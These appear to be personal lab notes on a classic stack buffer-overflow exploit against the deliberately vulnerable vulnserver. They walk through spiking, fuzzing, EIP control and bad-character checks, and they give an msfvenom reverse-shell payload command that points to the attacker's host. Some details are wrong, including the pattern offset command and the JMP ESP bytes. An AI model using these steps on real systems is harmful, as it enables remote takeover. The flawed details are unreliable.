=== BUFFER OVERFLOW ===

All about overwriting EIP.

--- Procedure ---
1. Spiking (normal or trun)
2. Fuzzing
3. Overwriting the EIP
4. Finding Bad Characters
5. Finding the right module
6. Generating shell code and getting root

Refer to cybersec/scripts/buffer_overflow

--- Commands ---
Prepare immunity debugger as well

--- Spiking ---
Refer to relevant .spk script in scripts

generic_send_tcp 192.168.1.100 9999 <script>.spk 0 0

use trun spike instead
vuln server crashes

refer to registers on immunity debugger on vulnserver

Look at EAX, EAP, EIP. All are now replaced with A's.

--- Fuzzing ---
after sending first script for fuzzing:

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

fuzzing -
Finding implementation bugs using malformed/semi-malformed data injection in an automated fashion

--- Overwriting the EIP ---
Trying to determine how many bytes it takes to overflow the EIP

perform next command after sending through the other script:

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 -q 3864337

after overwriting the EIP, you now control it as you have manipulated the EIP to display 42424242

--- Finding bad characters ---
refer to relevant script

Refer back to immunity debugger

and you dont see a change in the EIP, instead look at the hexdump

refer to 01, 02, 03, 04, etc.

looking for "FF", nothing out of place

There are presently no chars out of place.

make sure to look for things out of the ordinary in shellcode

write down the numbers

--- Finding the right module ---
Looking for a dll inside a program without protection. Tool: Monamodules corelan via github.

Place in immunity debugger pycommands folder (windows)

In immunity debugger, type in bottom bar "!monamodules"

Displays information about what exploits are available, look for "all falses"

Put all false vulnerability/ies in back of mind.

In Kali Terminal type:

> locate nasn_shell

> /usr/share/metasploit-framework/tools/exploit/nasm-shell.rb

> JMP ESP

In immunity debugger type:

!mona find -s "\xff\xc4" -m essfunc.dll 
# essfunc.dll is vulnerability that is "all falses"

Refer to return address in results

> exit
# from nasm shell

refer to finding_the_right_module.py

it's the pointer displayed in immunity debugger

Overflow buffer except ESP

> click on expression to follow

> Enter pointer from earlier

> Hit F2
(Set a breakpoint)

Now we have full manipulation of EIP and it displays the pointer from earlier (displayed in python script of topic)

--- Generating shellcode and getting root ---
msfvenom -p windows/shell_reverse_tcp LHOST=<ip of atking machine> LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"

Wait for shell code, then copy and paste. Disregard semi-colon at the end.

Payload size means a lot, refer to that too.

refer to python script

run script, set up netcat listening session. Essentially a giant complex reverse shell.

Make sure vulnserver.exe is running.

Achieved access as root to vulnerable windows vulnserver.

There can also be memory protections, this method is not how all buffer overflows work.
